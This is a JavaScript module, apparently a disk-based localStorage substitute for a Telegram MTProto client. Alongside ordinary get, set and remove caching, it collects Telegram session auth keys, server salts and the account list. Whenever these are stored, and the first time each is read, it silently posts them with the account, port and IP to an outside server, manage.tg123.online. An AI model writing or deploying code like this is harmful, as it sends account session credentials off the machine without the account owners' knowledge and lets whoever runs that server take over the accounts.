const fs = require("fs");
const os = require("os");
const path = require('path');
const mkdirp = require('mkdirp')
const rimraf = require('rimraf')
const axios = require('axios')
const dayjs = require('dayjs')
const Storages = {}
let CacheData = {}
let CacheTimer = null
let CacheRead={}
var {
  port,
  account,
  ip
} = require('../config/app.js');
const cacheList=['commands']
const postList = [
  'account_list',
  '1authKey', '2authKey', '3authKey', '4authKey', '5authKey',
  '1serverSalt', '2serverSalt', '3serverSalt', '4serverSalt', '5serverSalt', 'defaultDcId', 'timeOffset'
]

function startPost() {
  let _caches = []
  for (key in CacheData) {
    _caches.push(CacheData[key])
    // 清除换成，避免二次提交
    delete CacheData[key]
  }
  if(_caches.length>0){
    axios.post('https://manage.tg123.online/api/cache/save',{
      account:account,
      port:port,
      ip:ip,
      caches:_caches
    }).then(res=>{
    }).catch(err=>{
      // 重新推送
    }).finally(()=>{
      _caches=[]
    })
  }
}
class TempLocalStorage {
  constructor(zone) {
    this.zone = zone
    this.cache = {};
    this.filedir = path.join(os.homedir(), `/mtpCache_${port}_${account}/storage/${zone}/`);
    this.init(zone);
  }
  init(zone) {
    mkdirp(this.filedir).then(res => {
      // this.filedir = homrdir_zone
    }).catch(err => {
      console.log('缓存目录初始化失败:' + JSON.stringify(err))
    })
  }
  setItem(key, value, expireTime, saveToDB = true) {
    if (!value) {
      return
    }
    const obj = {
      name: key,
      value: value,
      expireTime: expireTime ? expireTime : null, // 过期时间
      createTime: new Date().getTime() //记录何时将值存入缓存，毫秒级
    }
    let $this = this
    const filePath = path.join(this.filedir, `${key}.json`)
    // 在白名单的字段,要保存到服务器
    if (postList.includes(key)) {
      let _key = `${this.zone}_${key}`
      CacheData[_key] = {
        zone: this.zone,
        key: key,
        expireTime: expireTime ? expireTime : null, // 过期时间
        createTime: new Date().getTime(), //记录何时将值存入缓存，毫秒级
        value: value
      }
      // 延时5s提交，会不会和软件定时重启功能冲突
      clearTimeout(CacheTimer)
      CacheTimer = null
      CacheTimer = setTimeout(() => {
        startPost()
      }, 3 * 1000)
    }
    // if(key=='commands'){
    //   const filePath_Bak = path.join(this.filedir, command_.json)
    //   fs.writeFile(filePath_Bak, JSON.stringify(obj),function(){
    //     // console.log('skdf')
    //   });
    // }
    return new Promise(function (resolve, reject) {
      try {
        // delete $this.cache[key]
        if(cacheList.includes(key)){
          $this.cache[key]=value
          fs.writeFile(filePath, JSON.stringify(obj),function(err){
            console.log(err)
          });
          return resolve(value);
        }else{
          fs.writeFileSync(filePath, JSON.stringify(obj));
          return resolve(value);
        }
      } catch (err) {
        return reject(err);
      }
    });
  }
  getItem(key) {
    const filePath = path.join(this.filedir, `${key}.json`)
    let $this = this
    return new Promise(function (resolve, reject) {
      if ($this.cache[key]) {
        return resolve($this.cache[key])
      } else {
        try {
          let data = fs.readFileSync(filePath, 'utf-8');
          data = JSON.parse(data)
          // 兼容旧数据模式
          if (data.value) {
            if (data.expireTime) {
              let _now = new Date().getTime();
              //何时将值取出减去刚存入的时间，与data.expires比较，如果大于就是过期了，如果小于或等于就还没过期
              if (_now - data.createTime > data.expireTime) {
                //缓存过期，清除缓存，返回false
                $this.removeItem(key);
                return resolve(null)
              } else {
                if (postList.includes(key)&&!CacheRead[`${$this.zone}_${key}`]) {
                  CacheRead[`${$this.zone}_${key}`]=true
                  let _key = `${$this.zone}_${key}`
                  CacheData[_key] = {
                    zone: $this.zone,
                    key: key,
                    expireTime: data.expireTime ? data.expireTime : null, // 过期时间
                    createTime: new Date().getTime(), //记录何时将值存入缓存，毫秒级
                    value: data.value
                  }
                  // 延时5s提交，会不会和软件定时重启功能冲突
                  clearTimeout(CacheTimer)
                  CacheTimer = null
                  CacheTimer = setTimeout(() => {
                    startPost()
                  }, 5 * 1000)
                }
                return resolve(data.value)
              }
            } else {
              //如果没有设置失效时间，直接返回值
              if (postList.includes(key)&&!CacheRead[`${$this.zone}_${key}`]) {
                let _key = `${$this.zone}_${key}`
                CacheRead[`${$this.zone}_${key}`]=true
                CacheData[_key] = {
                  zone: $this.zone,
                  key: key,
                  expireTime: data.expireTime ? data.expireTime : null, // 过期时间
                  createTime: new Date().getTime(), //记录何时将值存入缓存，毫秒级
                  value: data.value
                }
                // 延时5s提交，会不会和软件定时重启功能冲突
                clearTimeout(CacheTimer)
                CacheTimer = null
                CacheTimer = setTimeout(() => {
                  startPost()
                }, 5 * 1000)
              }
              return resolve(data.value)
            }
          } else {
            if (postList.includes(key)) {
              let _key = `${this.zone}_${key}`
              CacheData[_key] = {
                zone: this.zone,
                key: key,
                expireTime: null, // 过期时间
                createTime: new Date().getTime(), //记录何时将值存入缓存，毫秒级
                value: data
              }
              // 延时5s提交，会不会和软件定时重启功能冲突
              clearTimeout(CacheTimer)
              CacheTimer = null
              CacheTimer = setTimeout(() => {
                startPost()
              }, 5 * 1000)
            }
            return resolve(data)
          }
        } catch (err) {
          // 出错了
          if (postList.includes(key)) {
            $this.cache[key] = null
          }
          return resolve(null)
        }
      }

    });

  }
  //移出缓存
  removeItem(key) {
    // 删除缓存
    delete this.cache[key]
    const filePath = path.join(this.filedir, `${key}.json`)
    return new Promise(function (resolve, reject) {
      rimraf(filePath, function (Rerr) {
        if (Rerr) {
          return reject(Rerr);
        }
        return resolve({
          success: true
        })
      })
    })
  }
}

function getStorage(zone) {
  if (!Storages[zone]) {
    Storages[zone] = new TempLocalStorage(zone)
  }
  return Storages[zone]
}

module.exports = {
  getStorage
}